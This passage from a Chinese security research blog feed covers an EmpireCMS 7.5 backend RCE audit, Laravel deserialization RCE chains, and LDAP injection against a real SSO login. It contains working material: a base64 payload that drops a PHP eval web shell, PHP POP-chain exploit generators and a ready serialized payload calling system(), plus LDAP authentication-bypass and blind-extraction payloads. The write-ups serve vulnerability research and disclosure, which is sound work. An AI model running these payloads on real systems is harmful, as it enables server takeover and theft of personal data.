src="http://static.zybuluo.com/1160307775/86i5w3sopy8hik249iozojxo/image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png" alt="image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png-311.9kB"></p><p>其中base64编码部分为</p><pre><code>ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA=&gt;echo &#39;&lt;?php eval($_REQUEST[hp]);&#39;&gt;shell.php</code></pre><p>再点击<strong>启用此方案</strong>即可getshell，在<code>e/admin/template/</code>目录下生成shell.php</p><p><img src="http://static.zybuluo.com/1160307775/jck0izcors9rxr3b8ydk78gf/image_1djp21du0o250ocp31lnuad21t.png" alt="image_1djp21du0o250ocp31lnuad21t.png-64.3kB"><br><img src="http://static.zybuluo.com/1160307775/jeakcfnhj6ljtu09tq4tcsnu/image_1djp23v55qua1pa11b021uir1qmp2a.png" alt="image_1djp23v55qua1pa11b021uir1qmp2a.png-278.2kB"></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在e/class/functions.php的<code>NewsBq</code>函数中调用<code>WriteFiletext</code>函数向/e/data/tmp/index.php中写入文件并包含<br><img src="http://static.zybuluo.com/1160307775/vngxtn93avtnyhl4ix12mndr/image_1djp2kjth3i01l78dg91q3g1lba2n.png" alt="image_1djp2kjth3i01l78dg91q3g1lba2n.png-588.3kB"></p><p>查找一下哪些地方调用<code>NewsBq</code>函数，最后锁定在<code>e/admin/template/ListIndexpage.php</code>的<code>DefIndexpage</code>中<br><img src="http://static.zybuluo.com/1160307775/w6dlwq628kgerrrfr67flxfq/image_1djp2t8jo6ej1l7t1ui9t9i734.png" alt="image_1djp2t8jo6ej1l7t1ui9t9i734.png-459.9kB"></p><p>首先从库里获取得到<code>$r[temptext]</code>作为参数传入NewsBq，此时<code>$class</code>为null。那么文件内容可控吗？查看一下入库的语句，看看存不存在任意写入，全局搜索<code>enewsindexpage</code></p><p>在同文件ListIndexpage.php的第23行到47行，调用insert语句向<code>enewsindexpage</code>中增加数据，关键代码如下</p><pre><code>function AddIndexpage($add,$userid,$username){    global $empire,$dbtbpre;    if(!$add[tempname]||!$add[temptext])    {        printerror(&quot;EmptyIndexpageName&quot;,&quot;history.go(-1)&quot;);    }    ...    $add[tempname]=hRepPostStr($add[tempname],1);    $add[temptext]=RepPhpAspJspcode($add[temptext]);    $sql=$empire-&gt;query(&quot;insert into {$dbtbpre}enewsindexpage(tempname,temptext) values(&#39;&quot;.$add[tempname].&quot;&#39;,&#39;&quot;.eaddslashes2($add[temptext]).&quot;&#39;);&quot;);    ...}</code></pre><p>调用AddIndexpage的入口为：</p><pre><code>$enews=$_POST[&#39;enews&#39;];if(empty($enews)){$enews=$_GET[&#39;enews&#39;];}if($enews==&quot;AddIndexpage&quot;){    AddIndexpage($_POST,$logininid,$loginin);}</code></pre><p>所以<code>$add</code>为<code>$_POST</code>获取的数组，经过一次<code>eaddslashes2</code>函数清洗后以temptext字段存入库，而<code>eaddslashes2</code>在内部调用的是addslashes。猜想开发者最初可能只是为了防止sql注入，而没有进行其他类型过滤。但是我们执行任意命令是可以绕过addslashes的限制，取出来temptext字段来rce。</p><p>只需要用到复杂变量：<a href="https://www.jianshu.com/p/7c818ddc5731" target="_blank" rel="noopener">PHP复杂变量绕过addslashes()直接拿shell</a></p><p>整理思路：入库rce语句-&gt;取出库-&gt;写文件-&gt;包含rce-&gt;getshell</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对入库语句进行过滤，建议在<code>eaddslashes2</code>中增加一些过滤机制</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;帝国-EmpireCMS-7-5的两个后台RCE审计&quot;&gt;&lt;a href=&quot;#帝国-EmpireCMS-7-5的两个后台RCE审计&quot; class=&quot;headerlink&quot; title=&quot;帝国(EmpireCMS)7.5的两个后台RCE审计&quot;&gt;&lt;/a&gt;帝国(Empir
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Laravel由destrcuct引起的两处反序列化RCE分析</title>
    <link href="https://hpdoger.cn/2019/08/25/Laravel%E7%94%B1destrcuct%E5%BC%95%E8%B5%B7%E7%9A%84%E4%B8%A4%E5%A4%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/"/>
    <id>https://hpdoger.cn/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/</id>
    <published>2019-08-24T16:00:00.000Z</published>
    <updated>2019-08-27T09:19:16.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Laravel由destrcuct引起的两处反序列化RCE分析"><a href="#Laravel由destrcuct引起的两处反序列化RCE分析" class="headerlink" title="Laravel由destrcuct引起的两处反序列化RCE分析"></a>Laravel由destrcuct引起的两处反序列化RCE分析</h1><p>文章首发于安全客:<a href="https://www.anquanke.com/post/id/184541" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184541</a></p><p>laravel本身没有反序列化的调用机制，只有依赖于二次开发或者敏感函数才能触发反序列化。在Laravel5.3以后的版本引入<code>Illuminate\Broadcasting\PendingBroadcast.php</code>文件，存在__destrcut魔法函数引发一系列问题。这里我对框架本身能造成rce的点进行分析，一处是三方组件fzaninotto的回调调用<code>call_user_func_array</code>造成的rce，另一处是<br>p神在lumenserial找到laravel核心库的一处任意函数调用。</p><h1 id="Laravel自加载组件fzaninotto组件RCE"><a href="#Laravel自加载组件fzaninotto组件RCE" class="headerlink" title="Laravel自加载组件fzaninotto组件RCE"></a>Laravel自加载组件fzaninotto组件RCE</h1><h2 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h2><p><code>fzaninotto</code>在laravel 5.1以后composer默认安装<br><img src="http://static.zybuluo.com/1160307775/fc1ugl8qu5rkggox43xanknq/image_1dhoajden1lhl1rrdc1i18qr82s9.png" alt="image_1dhoajden1lhl1rrdc1i18qr82s9.png-164.8kB"></p><p><code>autoload_classmap.php</code>可以看到，在进行依赖加载的时候默认将<code>/fzaninotto/faker/src/Faker/Generator.php</code>注册到全局变量<code>$classmap</code>中，在程序调用相关类时遵从PSR4的规范，也就是说我们反序列化是可以调用<code>/fzaninotto/faker/src/Faker/</code>目录下的任何文件。</p><p><img src="http://static.zybuluo.com/1160307775/zrpwx3p0q227if3wqkeaucgd/image_1dhoalu3vkne6bp7mf1nfj7qhm.png" alt="image_1dhoalu3vkne6bp7mf1nfj7qhm.png-751.3kB"></p><h2 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h2><ul><li>laravel 5.3-5.8</li><li>寻找可控的反序列化点，才能触发该漏洞</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本地搭建laravel最新的环境 5.8.29<br><img src="http://static.zybuluo.com/1160307775/n45b5dlbpcdyukkok7h2sezo/image_1dhobbpoc1j5p1toc1rf71rd729l9.png" alt="image_1dhobbpoc1j5p1toc1rf71rd729l9.png-332kB"></p><p>构造一个反序列化可控点，在<code>app/Http/Controllers</code>文件夹下创建文件TaskController.php，源码如下:</p><pre><code>&lt;?phpnamespace App\Http\Controllers;class TaskController{    public function index(){        unserialize($_GET[&#39;url&#39;]);    }}</code></pre><p>在<code>routes/web.php</code>文件中添加这样路由记录</p><pre><code>Route::get(&#39;/bug&#39;, &#39;TaskController@index&#39;);</code></pre><p><img src="http://static.zybuluo.com/1160307775/9txqyfac02ns2bq2tp9n9s8c/image_1dhoc20tt1p37lmb30g19m1s1v13.png" alt="image_1dhoc20tt1p37lmb30g19m1s1v13.png-234.4kB"></p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>&lt;?php//exp.phpnamespace Faker{    class Generator{        protected $formatters = array();        public function __construct($formatters)        {            $this-&gt;formatters = $formatters;        }    }}namespace Illuminate\Broadcasting{    class PendingBroadcast.php``    {        protected $events;        protected $event;        public function __construct($events, $event)        {            $this-&gt;events = $events;            $this-&gt;event = $event;        }    }}namespace{    $generator = new Faker\Generator(array(&quot;dispatch&quot;=&gt;&quot;system&quot;));    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($generator,&quot;id&quot;);    echo urlencode(serialize($PendingBroadcast));}</code></pre><p>运行exp.php生成poc，如果环境搭建没有问题，直接请求下面的uri既能看到rce效果</p><pre><code>bug?url=O%3A40%3A&quot;Illuminate%5CBroadcasting%5CPendingBroadcast&quot;%3A2%3A%7Bs%3A9%3A&quot;%00%2A%00events&quot;%3BO%3A15%3A&quot;Faker%5CGenerator&quot;%3A1%3A%7Bs%3A13%3A&quot;%00%2A%00formatters&quot;%3Ba%3A1%3A%7Bs%3A8%3A&quot;dispatch&quot;%3Bs%3A6%3A&quot;system&quot;%3B%7D%7Ds%3A8%3A&quot;%00%2A%00event&quot;%3Bs%3A2%3A&quot;id&quot;%3B%7D</code></pre><p><img src="http://static.zybuluo.com/1160307775/ci645ofexwzuhhscrh6ix4bj/image_1dhocrcl7t951nqna0abdu19l71t.png" alt="image_1dhocrcl7t951nqna0abdu19l71t.png-97.7kB"></p><h3 id="EXP流程"><a href="#EXP流程" class="headerlink" title="EXP流程"></a>EXP流程</h3><p>在入口设置断点，传入payload<br><img src="http://static.zybuluo.com/1160307775/endgg8ppidelbmgxxi0uj1po/image_1dhod29lhevt1urr1u8j8v1pf32a.png" alt="image_1dhod29lhevt1urr1u8j8v1pf32a.png-239.1kB"></p><p>步入<code>Illuminate\Foundation\AliasLoader</code>的load函数，检测要实例的对象是否是laravel注册门面类，这里不满足条件<br><img src="http://static.zybuluo.com/1160307775/nipw8jf21ejjop49p2qvv1ss/image_1dhod50m81hlejqdltvv31ldd2n.png" alt="image_1dhod50m81hlejqdltvv31ldd2n.png-189.3kB"></p><p>因此步入<code>Composer\Autoload\ClassLoader</code>查找相应class对应于vendor中的php文件。也就是上文提到的laravel在加载服务容器时会执行的<code>autoload_class</code>作用结果</p><p><img src="http://static.zybuluo.com/1160307775/gnp5zqdryec1r1xm0swduzss/image_1dhoh4r22a9ln89upkgff5o53h.png" alt="image_1dhoh4r22a9ln89upkgff5o53h.png-531.1kB"></p><p>看到调用栈能够成功读取到<code>Faker\Generato</code>文件，并返回给includefile()</p><p>载入文件后步入到了反序列化的入口__destruct函数<br><img src="http://static.zybuluo.com/1160307775/xer6dqy2miqhm9n65n4f6ryi/image_1dhohl8c1b005lhch91ier1sij4o.png" alt="image_1dhohl8c1b005lhch91ier1sij4o.png-261.2kB"></p><p>步入执行dispatch函数，跳转到<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>的call方法<br><img src="http://static.zybuluo.com/1160307775/7mscxmikz6sh3m5vm6n71aga/image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png" alt="image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png-347.9kB"></p><p>跟进format函数如下图，发现此时的$arguments为可控值即我们序列化传入的$this-&gt;event<br><img src="http://static.zybuluo.com/1160307775/b913247o6m4bapk67pg329k8/image_1dhohhel0113lp9j14iq1o7g1deg4b.png" alt="image_1dhohhel0113lp9j14iq1o7g1deg4b.png-436.8kB"></p><p>继续步入看看getFormatter函数的具体实现</p><pre><code>public function getFormatter($formatter) # formatter  = dispatch{    if (isset($this-&gt;formatters[$formatter])) { # formatters可控        return $this-&gt;formatters[$formatter];    }    foreach ($this-&gt;providers as $provider) {        if (method_exists($provider, $formatter)) {            $this-&gt;formatters[$formatter] = array($provider, $formatter);            return $this-&gt;formatters[$formatter];        }    }    throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));}</code></pre><p>判断formatters[formatter]存在即返回，然而formatters也是我们可控的，那就能返回任意函数名了。即call_user_func_arrary的函数名和函数值都可控，rce实现～<br><img src="http://static.zybuluo.com/1160307775/n5f8fm6zdtweygg047xhitdb/image_1dhoj1sdkbh3110j1vmq123efuf65.png" alt="image_1dhoj1sdkbh3110j1vmq123efuf65.png-95.9kB"></p><h1 id="Dispatcher处存在任意函数调用"><a href="#Dispatcher处存在任意函数调用" class="headerlink" title="Dispatcher处存在任意函数调用"></a>Dispatcher处存在任意函数调用</h1><p>首先还是看一下造成漏洞的点在<code>vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</code>，允许我们使用<code>call_user_func</code>进行任意函数调用，且参数可控。<br><img src="http://static.zybuluo.com/1160307775/ceenl8t6uw3aipnvsc9x93p8/image_1dhnv8s401hhqdai12u51uqgia1p.png" alt="image_1dhnv8s401hhqdai12u51uqgia1p.png-110.2kB"></p><p>接着我们从源头追pop。入口方法依然在<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code>中，__destrcut执行dispatch函数<br><img src="http://static.zybuluo.com/1160307775/pdv4vp3nt9no1k94wb5jujkc/image_1dhnvcu1b1koj1f5o3oh9e1blr16.png" alt="image_1dhnvcu1b1koj1f5o3oh9e1blr16.png-108.5kB"></p><p>这次全局搜索哪些类存在dispatch函数，正好dispatcher本身中就存在，而且调用到了漏洞触发函数<code>dispatchToQueue</code>去执行<code>call_user_func</code></p><p><img src="http://static.zybuluo.com/1160307775/3vrpkiph81avi6cc2187ao5l/image_1dhnvi8t69udppb8bdhpo1sq11j.png" alt="image_1dhnvi8t69udppb8bdhpo1sq11j.png-167.8kB"></p><p>这里首先进行了如下条件判断</p><pre><code>$this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)</code></pre><p>跟进<code>commandShouldBeQueued</code>发现command参数必须是继承自    <code>ShouldQueue</code>接口的对象才能进入判断，这点我们可以通过序列化控制$command为对象。<br><img src="http://static.zybuluo.com/1160307775/9szugjpwpov3c0v9bj9r5so6/image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png" alt="image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png-34.1kB"></p><p>只需要全局搜一下哪个类实现了<code>ShouldQueue</code>接口，这里使用<code>BroadcastEvent</code><br><img src="http://static.zybuluo.com/1160307775/7b6akvknkvytxn922rfymihj/image_1dho0anindq2h3e12jnoj3vl23t.png" alt="image_1dho0anindq2h3e12jnoj3vl23t.png-228.8kB"></p><p>判断走通回到dispather，进行函数<code>dispatchToQueue</code>调用，<code>$connection</code>参数取自<code>$command</code>的connection属性<br><img src="http://static.zybuluo.com/1160307775/er9kg4fp6hp4rdcgorvkjfut/image_1dho0e2svl3kjdg166r1qv61cae4a.png" alt="image_1dho0e2svl3kjdg166r1qv61cae4a.png-137.1kB"></p><p>但是<code>BroadcastEvent</code>没有connection属性。不过没有关系，我们自己序列化可以给类添加任何想要的属性。因为反序列化的时候不执行该类__contrust，自然也不会在<code>BroadcastEvent</code>中报错。</p><p>流程就这么简单，构造每个类的属性，让条件走通就行了。构造的exp</p><pre><code>&lt;?phpnamespace Illuminate\Broadcasting{    class PendingBroadcast    {        protected $events;        protected $event;        public function __construct($events, $event)        {            $this-&gt;events = $events;            $this-&gt;event = $event;        }    }    class BroadcastEvent    {      protected $connection;      public function __construct($connection)      {        $this-&gt;connection = $connection;      }    }}namespace Illuminate\Bus{    class Dispatcher{        protected $queueResolver;        public function __construct($queueResolver)        {          $this-&gt;queueResolver = $queueResolver;        }    }}namespace{    $command = new Illuminate\Broadcasting\BroadcastEvent(&quot;whoami&quot;);    $dispater = new Illuminate\Bus\Dispatcher(&quot;system&quot;);    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);    echo urlencode(serialize($PendingBroadcast));}</code></pre><p>只不过是没有回显，需要我们可以外带出去，这里调试的结果成功执行system获取whoami为hpdoger<br><img src="http://static.zybuluo.com/1160307775/72f5906tt0oafrk68hj4q2yl/image_1dho0phn5uka1c5316dv1g8n1ckr4n.png" alt="image_1dho0phn5uka1c5316dv1g8n1ckr4n.png-351.9kB"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Laravel由destrcuct引起的两处反序列化RCE分析&quot;&gt;&lt;a href=&quot;#Laravel由destrcuct引起的两处反序列化RCE分析&quot; class=&quot;headerlink&quot; title=&quot;Laravel由destrcuct引起的两处反序列化RCE分
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>从一次漏洞挖掘入门ldap注入</title>
    <link href="https://hpdoger.cn/2019/08/13/%E4%BB%8E%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8ldap%E6%B3%A8%E5%85%A5/"/>
    <id>https://hpdoger.cn/2019/08/13/从一次漏洞挖掘入门ldap注入/</id>
    <published>2019-08-12T16:00:00.000Z</published>
    <updated>2019-08-21T07:46:39.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从一次漏洞挖掘入门ldap注入"><a href="#从一次漏洞挖掘入门ldap注入" class="headerlink" title="从一次漏洞挖掘入门ldap注入"></a>从一次漏洞挖掘入门ldap注入</h1><p>原文首发于先知:<a href="https://xz.aliyun.com/t/5689" target="_blank" rel="noopener">https://xz.aliyun.com/t/5689</a></p><p>在最近的一次测试中，随缘摸到了一个sso系统，留给前台的功能只有登陆。</p><p>没有验证码，但是登陆点强制要求每个用户更改强密码，而且除了管理员和测试账号其他大部分都是工号形式，所以不考虑撞库。直接fuzz一把梭</p><p>测试过程中发现username对于下面payload会存在两种不同回显<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132645-4d1fa1ac-a78a-1.png" alt="image_1dfitlu921a2l2qg1qlf1ulrpaom.png-64.6kB"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132645-4d715baa-a78a-1.png" alt="image_1dfito82tqcipm01gsb8vt87g13.png-70.4kB"></p><p>当时我并不理解这种payload是什么库的数据格式。但是看到存在”!”字符时，页面的回显是不同的，而”!”在绝大多数语言中都是取反的表达形式，自然会产生不同的布尔值，那么无疑就是个xxx注入点了</p><h1 id="何为LDAP"><a href="#何为LDAP" class="headerlink" title="何为LDAP"></a>何为LDAP</h1><p>通过payload的类型，看到是经典的ldap注入语句。一种老协议和数据存储形式了</p><h2 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h2><p>LDAP(Lightweight Directory Access Protocol):即轻量级目录访问协议。是一种运行于TCP/IP之上的在线目录访问协议，主要用于目录中资源的搜索和查询。使用最广泛的LDAP服务如微软的ADAM(Active Directory Application Mode)和OpenLDAP</p><h2 id="LDAP存储"><a href="#LDAP存储" class="headerlink" title="LDAP存储"></a>LDAP存储</h2><p>MySQL数据库，数据都是按记录一条条记录存在表中。而LDAP数据库，是树结构的，数据存储在叶子节点上。</p><p>LDAP目录中的信息是按照树形结构组织的:</p><pre><code>dn:一条记录的位置dc:一条记录所属的区域ou:一条记录所属的组织cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数据的查询。首先要说明是哪一棵树(dc)，然后是从树根到目标所经过的所有分叉(ou)，最后就是目标的名字(cn/uid)，借用一张图来表明结构如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132646-4db2fcb8-a78a-1.png" alt="image_1dfivc13p1s9a19421h52facl6120.png-74.2kB"></p><h2 id="条目-amp-对象类-amp-属性"><a href="#条目-amp-对象类-amp-属性" class="headerlink" title="条目&amp;对象类&amp;属性"></a>条目&amp;对象类&amp;属性</h2><ul><li><p>条目(entry):是目录中存储的基本信息单元，上图每一个方框代表一个entry。一个entry有若干个属性和若干个值，有些entry还能包含子entry</p></li><li><p>对象类(obejectclass):对象类封装了可选/必选<strong>属性</strong>，同时对象类也是支持继承的。一个entry必须包含一个objectClass，且需要赋予至少一个值。而且objectClass有着严格的等级之分，最顶层是top和alias。例如，organizationalPerson这个objectClass就隶属于person，而person又隶属于top<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132646-4df19b8a-a78a-1.png" alt="image_1dfj1uep3pjh32v1bbe1oop16jk2d.png-11.8kB"></p></li><li><p>属性(atrribute):顾名思义，用来存储字段值。被封装在objectclass里的，每个属性(attribute)也会分配唯一的OID号码</p></li></ul><h2 id="LDAP查询语句"><a href="#LDAP查询语句" class="headerlink" title="LDAP查询语句"></a>LDAP查询语句</h2><p>一个圆括号内的判断语句又称为一个过滤器filter。</p><pre><code>( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter))</code></pre><h3 id="逻辑与-amp"><a href="#逻辑与-amp" class="headerlink" title="逻辑与&amp;"></a>逻辑与&amp;</h3><pre><code>(&amp;(username=Hpdoger)(password=ikun))</code></pre><p>查找name属性为Hpdoger并且password属性值为ikun的所有条目</p><h3 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或|"></a>逻辑或|</h3><pre><code>(|(username=Hpdoger)(displayname=Hpdoger))</code></pre><p>查找username或者displayname为Hpdoger的所有条目</p><h3 id="特殊说明"><a href="#特殊说明" class="headerlink" title="特殊说明"></a>特殊说明</h3><p>除使用逻辑操作符外，还允许使用下面的单独符号作为两个特殊常量</p><pre><code>(&amp;)     -&gt;Absolute TRUE (|)     -&gt;Absolute FALSE *       -&gt;通配符</code></pre><p>另外，默认情况下，LDAP的DN和所有属性都不区分大小写，即在查询时：</p><pre><code>(username=Hpdoger) &lt;=&gt; (username=HPDOGER)</code></pre><h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><p>由于LDAP的出现可以追溯到1980年，关于它的漏洞也是历史悠久。LDAP注入攻击和SQL注入攻击相似，利用用户引入的参数生成LDAP查询。攻击者构造恶意的查询语句读取其它数据/跨objectclass读取属性，早在wooyun时代就有师傅详细的剖析了这类漏洞。</p><p>上文说到LDAP过滤器的结构和使用得最广泛的LDAP：ADAM和OpenLDAP。然而对于下面两种情况</p><h2 id="无逻辑操作符的注入"><a href="#无逻辑操作符的注入" class="headerlink" title="无逻辑操作符的注入"></a>无逻辑操作符的注入</h2><p>情景：<code>(attribute=$input)</code></p><p>我们构造输入:<code>$input=value)(injected_filter</code></p><p>代入查询的完整语句就为:</p><pre><code>(attribute=value)(injected_filter)</code></pre><p>由于一个括号内代表一个过滤器，在OpenLDAP实施中，第二个过滤器会被忽略，只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的。</p><p>因而这类情况仅对于OpenLDAP有一定的影响。</p><p>例如我们要想查询一个字段是否存在某值时，可以用<code>$input=x*</code>进行推移，利用页面响应不同判断x*是否查询成功</p><h2 id="带有逻辑操作符的注入"><a href="#带有逻辑操作符的注入" class="headerlink" title="带有逻辑操作符的注入"></a>带有逻辑操作符的注入</h2><pre><code>(|(attribute=$input)(second_filter))(&amp;(attribute=$input)(second_filter))</code></pre><p>此时带有逻辑操作符的括号相当于一个过滤器。此时形如value)(injected_filter)的注入会变成如下过滤器结构</p><pre><code>(&amp;(attribute=value)(injected_filter))(second_filter)</code></pre><p>虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。</p><p>举个最简单的登陆注入的例子，如果验证登陆的查询语句是这样:</p><pre><code>(&amp;(USER=$username)(PASSWORD=$pwd)) </code></pre><p>输入$username = <code>admin)(&amp;)(</code>使查询语句变为</p><pre><code>(&amp;(USER=admin)(&amp;))((PASSWORD=$pwd)) </code></pre><p>即可让后面的password过滤器失效，执行第一个过滤器而返回true，达到万能密码的效果。</p><h2 id="后注入分析"><a href="#后注入分析" class="headerlink" title="后注入分析"></a>后注入分析</h2><p>注入大致分为and、or类型这里就不赘述，感兴趣的可以看之前wooyun的文章：<br><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">LDAP注入与防御剖析</a></p><p>还有一个joomla的一个userPassword注入实例:<br><a href="https://www.anquanke.com/post/id/86899" target="_blank" rel="noopener">Joomla! LDAP注入导致登录认证绕过漏洞</a></p><h1 id="回到实例"><a href="#回到实例" class="headerlink" title="回到实例"></a>回到实例</h1><p>大致了解注入类型，就开始了第一轮尝试</p><p>当通配符匹配到用户名时返回<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132647-4e7d6dae-a78a-1.png" alt="image_1dfj9gu7f1d261ad2o9jao3q082q.png-40.1kB"></p><p>用户名不存在时返回<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4ecb7d3c-a78a-1.png" alt="image_1dfj9iml33968bod9etnogsu3n.png-49.7kB"></p><p>构造用户名恒真<code>username=admin)(%26&amp;password=123</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4ee14e8c-a78a-1.png" alt="image_1dfj9mj071drl59b37j21teu544.png-49.7kB"></p><p>说明它判断用户的形式并不是<code>(&amp;(USER=$username)(PASSWORD=$pwd))</code>，因为我们查到的用户名是true，但是验证密码false</p><p>由于自己也没搞过LDAP的开发..就盲猜后端应该就是这种情况:<br>执行了<code>(&amp;(USER=$username)(objectclass=xxx))</code>后，取password与$password进行对比</p><h2 id="ACTION"><a href="#ACTION" class="headerlink" title="ACTION"></a>ACTION</h2><p>那么首先要知道它继承了哪些objectclass？因为树结构都有根，使我们能顺藤摸瓜。首先是top肯定存在，回显如下:<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4f4b148e-a78a-1.png" alt="image_1dfje9v39cu01n95u4fqln1ed9.png-36.9kB"></p><p>但是top的子类太多了，先fuzz一下objectclass的值缩小范围，payload：</p><pre><code>username=admin)(objectclass%3d$str</code></pre><p>发现存在<strong>person</strong>和<strong>user</strong>两个objectclass</p><p>再fuzz一下attribute得到的值如下:</p><pre><code>username=admin)($str%3d*</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-4ff6ba6e-a78a-1.png" alt="image_1dfjehfm71qa71ri11b481mj9183m.png-80.2kB"></p><p>凭借这些信息去LDAP文档里溯继承链，先去找user类，继承自organizationalPerson<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-5033cd5a-a78a-1.png" alt="image_1dfjeub3c1dfvnb5dv6k61i7l13.png-67.3kB"></p><p>同理organizationalperson又是继承自person的，person继承自top，最终的继承链为：</p><pre><code>top-&gt;person-&gt;organizationalperson-&gt;user</code></pre><p>也就是说这些类存在的属性都可能被调用。很遗憾的是我并没有fuzz到password类型参数，一般来说password会以userPassword的形式存储在person对象中，很多基于ldap的开发demo中也是这样写的。</p><p>但是userPassword毕竟也只是person类可选的属性，开发大概率是改名或者重写属性了，这也是这个漏洞没有上升到严重危害的瓶颈点<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-50554700-a78a-1.png" alt="image_1dfki06dp1sqm147onc11odt3at13.png-127.9kB"></p><p>不过依然可以注出一些有用的数据。例如所有用户的用户名、邮箱、手机号、姓名、性别等等，说不定以后可以越权修改某账号性别呢-3-</p><h3 id="盲注mobile"><a href="#盲注mobile" class="headerlink" title="盲注mobile"></a>盲注mobile</h3><p>尝试注入管理员的手机号mobile</p><pre><code>username=admin)(mobile=%s*&amp;password=123</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-50b0e8f8-a78a-1.png" alt="image_1dfkgoopj19s4kkkq0sulvmp4m.png-52.6kB"></p><p>利用通配符不断添加数字，同理邮箱也可以注出来，与sql盲注的思路相同。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-50c968d8-a78a-1.png" alt="image_1dfl7ap4k1pna18bk17ec24166o2n.png-42.3kB"></p><h3 id="盲注username"><a href="#盲注username" class="headerlink" title="盲注username"></a>盲注username</h3><p>毕竟对于sso，收集username是很有用的信息。那么问题来了，我们是可以通过生成字典来遍历存在的用户名，但是这个工作量是指数倍的增长，一天能跑完一个字母开头的就不错了，而且浪费了通配符的作用。</p><p>可是又想做到无限迭代把所有用户一个不漏的跑完，passer6y师傅提醒我用笛卡尔积</p><p>最后画出来的流程图大致如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-512168da-a78a-1.png" alt="image_1dfkks6d86j6ra51m7821d3831g.png-87.6kB"></p><p>最后测试用户大概有1w多，然而这些大部分是测试帐号，未授权的情况下也不能跑具体数据，但也算是验证了思路的可执行性。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>网上关于这类漏洞的fuzz思路也比较久远了，第一次接触这种漏洞，若文章思路如果有什么不对的地方还请师傅们斧正。自己对这类漏洞的姿势理解很浅，现在漏洞已经修复，但是如果有师傅对于password的注入有想法，可以私下交流一下</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</a><br><a 